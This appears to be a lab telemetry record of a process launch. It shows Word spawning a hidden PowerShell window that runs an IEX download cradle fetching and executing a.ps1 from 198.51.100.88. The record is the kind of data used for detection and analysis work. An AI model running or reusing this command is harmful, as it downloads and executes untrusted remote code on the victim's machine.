    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    cmd: powershell.exe -NoProfile -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.88/a.ps1')
    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
    parent_cmd: WINWORD.EXE /n
    user: LAB\frank
    dest_ip: null
    dest_port: null
    name: null
